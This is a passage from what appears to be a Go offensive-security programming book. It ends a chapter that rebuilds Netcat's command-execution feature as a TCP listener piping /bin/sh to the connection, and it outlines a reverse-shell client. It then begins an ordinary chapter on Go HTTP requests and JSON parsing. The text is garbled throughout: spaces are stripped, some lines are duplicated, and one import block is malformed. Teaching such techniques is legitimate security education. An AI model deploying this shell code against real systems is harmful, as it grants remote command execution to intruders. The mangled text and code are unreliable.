argumentsuchthatyou’reininteractivemode,whichallows
youtomanipulatestdinandstdoutmorereliably:
cmd:=exec.Command("/bin/sh","-i")
ThiscreatesaninstanceofCmdbutdoesn’tyetexecutethe
command.Youhaveacoupleofoptionsformanipulating
stdinandstdout.YoucoulduseCopy(Writer,Reader)asdiscussed
previously,ordirectlyassignReaderandWritertoCmd.Let’s
directlyassignyourConnobjecttobothcmd.Stdinandcmd.Stdout,
likeso:
cmd.Stdin=conn
cmd.Stdout=conn
Withthesetupofthecommandandthestreamscomplete,
yourunthecommandbyusingcmd.Run():
iferr:=cmd.Run();err!=nil{
iferr:=cmd.Run();err!=nil{
//Handleerror.
}
ThislogicworksperfectlyfineonLinuxsystems.
However,whentweakingandrunningtheprogramona
Windowssystem,runningcmd.exeinsteadof/bin/bash,you’llfind
thattheconnectingclientneverreceivesthecommandoutput
becauseofsomeWindows-specifichandlingofanonymous
pipes.Herearetwosolutionsforthisproblem.
First,youcantweakthecodetoexplicitlyforcethe
flushingofstdouttocorrectthisnuance.Insteadofassigning
Conndirectlytocmd.Stdout,youimplementacustomWriterthat
wrapsbufio.Writer(abufferedwriter)andexplicitlycallsitsFlush
methodtoforcethebuffertobeflushed.Refertothe
“CreatingtheEchoServer”onpage35foranexemplaryuse
ofbufio.Writer.
Here’sthedefinitionofthecustomwriter,Flusher:
//Flusherwrapsbufio.Writer,explicitlyflushingonallwrites.
typeFlusherstruct{
w*bufio.Writer
}
//NewFlushercreatesanewFlusherfromanio.Writer.
funcNewFlusher(wio.Writer)*Flusher{
return&Flusher{
w:bufio.NewWriter(w),
}
}
//Writewritesbytesandexplicitlyflushesbuffer.
❶func(foo*Flusher)Write(b[]byte)(int,error){
count,err:=foo.w.Write(b)❷
iferr!=nil{
return-1,err
}
iferr:=foo.w.Flush()❸;err!=nil{
return-1,err
}
returncount,err
}
TheFlushertypeimplementsaWrite([]byte)function❶that
writes❷thedatatotheunderlyingbufferedwriterandthen
flushes❸theoutput.
Withtheimplementationofacustomwriter,youcantweak
theconnectionhandlertoinstantiateandusethisFlushercustom
typeforcmd.Stdout:
funchandle(connnet.Conn){
//Explicitlycalling/bin/shandusing-iforinteractivemode
//sothatwecanuseitforstdinandstdout.
//ForWindowsuseexec.Command("cmd.exe").
cmd:=exec.Command("/bin/sh","-i")
//Setstdintoourconnection
cmd.Stdin=conn
//CreateaFlusherfromtheconnectiontouseforstdout.
//Thisensuresstdoutisflushedadequatelyandsentvianet.Conn.
cmd.Stdout=NewFlusher(conn)
//Runthecommand.
iferr:=cmd.Run();err!=nil{
log.Fatalln(err)
}
}
Thissolution,whileadequate,certainlyisn’telegant.
Althoughworkingcodeismoreimportantthanelegantcode,
we’llusethisproblemasanopportunitytointroducethe
io.Pipe()function,Go’ssynchronous,in-memorypipethatcan
beusedforconnectingReadersandWriters:
funcPipe()(*PipeReader,*PipeWriter)
UsingPipeReaderandPipeWriterallowsyoutoavoidhavingto
explicitlyflushthewriterandsynchronouslyconnectstdout
andtheTCPconnection.Youwill,yetagain,rewritethe
handlerfunction:
funchandle(connnet.Conn){
//Explicitlycalling/bin/shandusing-iforinteractivemode
//sothatwecanuseitforstdinandstdout.
//ForWindowsuseexec.Command("cmd.exe").
cmd:=exec.Command("/bin/sh","-i")
//Setstdintoourconnection
rp,wp:=io.Pipe()❶
cmd.Stdin=conn
❷cmd.Stdout=wp
❸goio.Copy(conn,rp)
cmd.Run()
conn.Close()
}
Thecalltoio.Pipe()❶createsbothareaderandawriterthat
aresynchronouslyconnected—anydatawrittentothewriter
(wpinthisexample)willbereadbythereader(rp).So,you
assignthewritertocmd.Stdout❷andthenuseio.Copy(conn,rp)❸
tolinkthePipeReadertotheTCPconnection.Youdothisby
usingagoroutinetopreventthecodefromblocking.Any
standardoutputfromthecommandgetssenttothewriterand
thensubsequentlypipedtothereaderandoutovertheTCP
connection.How’sthatforelegant?
Withthat,you’vesuccessfullyimplementedNetcat’s
gapingsecurityholefromtheperspectiveofaTCPlistener
awaitingaconnection.Youcanusesimilarlogictoimplement
thefeaturefromtheperspectiveofaconnectingclient
redirectingstdoutandstdinofalocalbinarytoaremote
listener.Theprecisedetailsarelefttoyoutodetermine,but
wouldlikelyincludethefollowing:
Establishaconnectiontoaremotelistenervianet.Dial(network,addressstring).
InitializeaCmdviaexec.Command(namestring,arg...string).
RedirectStdinandStdoutpropertiestoutilizethenet.Connobject.
Runthecommand.
Atthispoint,thelistenershouldreceiveaconnection.Any
datasenttotheclientshouldbeinterpretedasstdinonthe
client,andanydatareceivedonthelistenershouldbe
interpretedasstdout.Thefullcodeofthisexampleisavailable
athttps://github.com/blackhat-go/bhg/blob/master/ch-
2/netcat-exec/main.go.
SUMMARY
Nowthatyou’veexploredpracticalapplicationsandusageof
Goasitrelatestonetworking,I/O,andconcurrency,let’s
moveontocreatingusableHTTPclients.
3
HTTPCLIENTSANDREMOTE
INTERACTIONWITHTOOLS
InChapter2,youlearnedhowtoharnessthepowerofTCP
withvarioustechniquesforcreatingusableclientsandservers.
Thisisthefirstinaseriesofchaptersthatexploresavarietyof
protocolsonhigherlayersoftheOSImodel.Becauseofits
prevalenceonnetworks,itsaffiliationwithrelaxedegress
controls,anditsgeneralflexibility,let’sbeginwithHTTP.
Thischapterfocusesontheclientside.Itwillfirst
introduceyoutothebasicsofbuildingandcustomizingHTTP
requestsandreceivingtheirresponses.Thenyou’lllearnhow
toparsestructuredresponsedatasotheclientcaninterrogate
theinformationtodetermineactionableorrelevantdata.
Finally,you’lllearnhowtoapplythesefundamentalsby
buildingHTTPclientsthatinteractwithavarietyofsecurity
toolsandresources.Theclientsyoudevelopwillqueryand
consumetheAPIsofShodan,Bing,andMetasploitandwill
searchandparsedocumentmetadatainamannersimilartothe
metadatasearchtoolFOCA.
HTTPFUNDAMENTALSWITHGO
Althoughyoudon’tneedacomprehensiveunderstandingof
HTTP,youshouldknowsomefundamentalsbeforeyouget
started.
First,HTTPisastatelessprotocol:theserverdoesn’t
inherentlymaintainstateandstatusforeachrequest.Instead,
stateistrackedthroughavarietyofmeans,whichmayinclude
sessionidentifiers,cookies,HTTPheaders,andmore.The
clientandservershavearesponsibilitytoproperlynegotiate
andvalidatethisstate.
Second,communicationsbetweenclientsandserverscan
occureithersynchronouslyorasynchronously,butthey
operateonarequest/responsecycle.Youcanincludeseveral
optionsandheadersintherequestinordertoinfluencethe
behavioroftheserverandtocreateusablewebapplications.
Mostcommonly,servershostfilesthatawebbrowserrenders
toproduceagraphical,organized,andstylishrepresentationof
thedata.Buttheendpointcanservearbitrarydatatypes.APIs
commonlycommunicateviamorestructureddataencoding,
suchasXML,JSON,orMSGRPC.Insomecases,thedata
retrievedmaybeinbinaryformat,representinganarbitrary
filetypefordownload.
Finally,Gocontainsconveniencefunctionssoyoucan
quicklyandeasilybuildandsendHTTPrequeststoaserver
andsubsequentlyretrieveandprocesstheresponse.Through
someofthemechanismsyou’velearnedinpreviouschapters,
you’llfindthattheconventionsforhandlingstructureddata
proveextremelyconvenientwheninteractingwithHTTP
APIs.
CallingHTTPAPIs
CallingHTTPAPIs
Let’sbegintheHTTPdiscussionbyexaminingbasicrequests.
Go’snet/httpstandardpackagecontainsseveralconvenience
functionstoquicklyandeasilysendPOST,GET,andHEAD
requests,whicharearguablythemostcommonHTTPverbs
you’lluse.Thesefunctionstakethefollowingforms:
Get(urlstring)(resp*Response,errerror)
Head(urlstring)(resp*Response,errerror)
Post(urlstring,bodyTypestring,bodyio.Reader)(resp*Response,errerror)
Eachfunctiontakes—asaparameter—theURLasastring
valueandusesitfortherequest’sdestination.ThePost()
functionisslightlymorecomplexthantheGet()andHead()
functions.Post()takestwoadditionalparameters:bodyType,
whichisastringvaluethatyouusefortheContent-Type
HTTPheader(commonlyapplication/x-www-form-urlencoded)ofthe
requestbody,andanio.Reader,whichyoulearnedaboutin
Chapter2.
Youcanseeasampleimplementationofeachofthese
functionsinListing3-1.(Allthecodelistingsattheroot
locationof/existundertheprovidedgithubrepo
https://github.com/blackhat-go/bhg/.)NotethatthePOST
requestcreatestherequestbodyfromformvaluesandsetsthe
Content-Typeheader.Ineachcase,youmustclosethe
responsebodyafteryou’redonereadingdatafromit.
r1,err:=http.Get("http://www.google.com/robots.txt")
//Readresponsebody.Notshown.
deferr1.Body.Close()
r2,err:=http.Head("http://www.google.com/robots.txt")
//Readresponsebody.Notshown.
deferr2.Body.Close()
form:=url.Values{}
form.Add("foo","bar")
r3,err=http.Post❶(
"https://www.google.com/robots.txt",
❷"application/x-www-form-urlencoded",
strings.NewReader(form.Encode()❸),
)
//Readresponsebody.Notshown.
deferr3.Body.Close()
Listing3-1:SampleimplementationsoftheGet(),Head(),andPost()functions(/ch-
3/basic/main.go)
ThePOSTfunctioncall❶followsthefairlycommon
patternofsettingtheContent-Typetoapplication/x-www-form-
urlencoded❷,whileURL-encodingformdata❸.
GohasanadditionalPOSTrequestconveniencefunction,
calledPostForm(),whichremovesthetediousnessofsetting
thosevaluesandmanuallyencodingeveryrequest;youcan
seeitssyntaxhere:
funcPostForm(urlstring,dataurl.Values)(resp*Response,errerror)
IfyouwanttosubstitutethePostForm()functionforthePost()
implementationinListing3-1,youusesomethinglikethebold
codeinListing3-2.
form:=url.Values{}
form.Add("foo","bar")
r3,err:=http.PostForm("https://www.google.com/robots.txt",form)
//Readresponsebodyandclose.
Listing3-2:UsingthePostForm()functioninsteadofPost()(/ch-3/basic/main.go)
Unfortunately,noconveniencefunctionsexistforother
HTTPverbs,suchasPATCH,PUT,orDELETE.You’lluse
theseverbsmostlytointeractwithRESTfulAPIs,which
employgeneralguidelinesonhowandwhyaservershould
usethem;butnothingissetinstone,andHTTPisliketheOld
Westwhenitcomestoverbs.Infact,we’veoftentoyedwith
theideaofcreatinganewwebframeworkthatexclusively
usesDELETEforeverything.we’dcallitDELETE.js,andit
wouldbeatophitonHackerNewsforsure.Byreadingthis,
you’reagreeingnottostealthisidea!
GeneratingaRequest
Togeneratearequestwithoneoftheseverbs,youcanusethe
NewRequest()functiontocreatetheRequeststruct,whichyou’ll
subsequentlysendusingtheClientfunction’sDo()method.We
promisethatit’ssimplerthanitsounds.Thefunction
prototypeforhttp.NewRequest()isasfollows:
funcNewRequest(❶method,❷urlstring,❸bodyio.Reader)(req*Request,err
error)
YouneedtosupplytheHTTPverb❶anddestinationURL
❷toNewRequest()asthefirsttwostringparameters.Muchlike
thefirstPOSTexampleinListing3-1,youcanoptionally
supplytherequestbodybypassinginanio.Readerasthethird
andfinalparameter❸.
Listing3-3showsacallwithoutanHTTPbody—a
DELETErequest.
req,err:=http.NewRequest("DELETE","https://www.google.com/robots.txt",nil)
varclienthttp.Client
resp,err:=client.Do(req)
//Readresponsebodyandclose.
Listing3-3:SendingaDELETErequest(/ch-3/basic/main.go)
Now,Listing3-4showsaPUTrequestwithanio.Reader
body(aPATCHrequestlookssimilar).
form:=url.Values{}
form.Add("foo","bar")
varclienthttp.Client
req,err:=http.NewRequest(
"PUT",
"https://www.google.com/robots.txt",
strings.NewReader(form.Encode()),
)
resp,err:=client.Do(req)
//Readresponsebodyandclose.
Listing3-4:SendingaPUTrequest(/ch-3/basic/main.go)
ThestandardGonet/httplibrarycontainsseveralfunctions
thatyoucanusetomanipulatetherequestbeforeit’ssentto
theserver.You’lllearnsomeofthemorerelevantand
applicablevariantsasyouworkthroughpracticalexamples
throughoutthischapter.Butfirst,we’llshowyouhowtodo
somethingmeaningfulwiththeHTTPresponsethattheserver
receives.
UsingStructuredResponseParsing
Intheprevioussection,youlearnedthemechanismsfor
buildingandsendingHTTPrequestsinGo.Eachofthose
examplesglossedoverresponsehandling,essentiallyignoring
itforthetimebeing.Butinspectingvariouscomponentsofthe
HTTPresponseisacrucialaspectofanyHTTP-relatedtask,
likereadingtheresponsebody,accessingcookiesandheaders,
orsimplyinspectingtheHTTPstatuscode.
Listing3-5refinestheGETrequestinListing3-1to
displaythestatuscodeandresponsebody—inthiscase,
Google’srobots.txtfile.Itusestheioutil.ReadAll()functionto
readdatafromtheresponsebody,doessomeerrorchecking,
andprintstheHTTPstatuscodeandresponsebodytostdout.
❶resp,err:=http.Get("https://www.google.com/robots.txt")
iferr!=nil{
log.Panicln(err)
}
//PrintHTTPStatus
fmt.Println(resp.Status❷)
//Readanddisplayresponsebody
body,err:=ioutil.ReadAll(resp.Body❸)
iferr!=nil{
log.Panicln(err)
}
fmt.Println(string(body))
❹resp.Body.Close()
Listing3-5:ProcessingtheHTTPresponsebody(/ch-3/basic/main.go)
Onceyoureceiveyourresponse,namedresp❶intheabove
code,youcanretrievethestatusstring(forexample,200OK)by
accessingtheexportedStatusparameter❷;notshowninour
example,thereisasimilarStatusCodeparameterthataccesses
onlytheintegerportionofthestatusstring.
TheResponsetypecontainsanexportedBodyparameter❸,
whichisoftypeio.ReadCloser.Anio.ReadCloserisaninterfacethat
actsasanio.Readeraswellasanio.Closer,oraninterfacethat
requirestheimplementationofaClose()functiontoclosethe
readerandperformanycleanup.Thedetailsaresomewhat
inconsequential;justknowthatafterreadingthedatafroman
io.ReadCloser,you’llneedtocalltheClose()function❹onthe
responsebody.Usingdefertoclosetheresponsebodyisa
commonpractice;thiswillensurethatthebodyisclosed
beforeyoureturnit.
Now,runthescripttoseetheerrorstatusandresponse
body:
$gorunmain.go
200OK
User-agent:*
Disallow:/search
Allow:/search/about
Disallow:/sdch
Disallow:/groups
Disallow:/index.html?
Disallow:/?
Allow:/?hl=
Disallow:/?hl=*&
Allow:/?hl=*&gws_rd=ssl$
Disallow:/?hl=*&*&gws_rd=ssl
--snip--
Ifyouencounteraneedtoparsemorestructureddata—and
it’slikelythatyouwill—youcanreadtheresponsebodyand
decodeitbyusingtheconventionspresentedinChapter2.For
example,imagineyou’reinteractingwithanAPIthat
communicatesusingJSON,andoneendpoint—say,/ping—
returnsthefollowingresponseindicatingtheserverstate:
{"Message":"Allisgoodwiththeworld","Status":"Success"}
YoucaninteractwiththisendpointanddecodetheJSON
messagebyusingtheprograminListing3-6.
packagemain
import{
encoding/json"
log
net/http
}
❶typeStatusstruct{
Messagestring
Statusstring
}
funcmain(){
❷res,err:=http.Post(
"http://IP:PORT/ping",
"application/json",
nil,
)
iferr!=nil{
log.Fatalln(err)
}
varstatusStatus
❸iferr:=json.NewDecoder(res.Body).Decode(&status);err!=nil{
log.Fatalln(err)
}
deferres.Body.Close()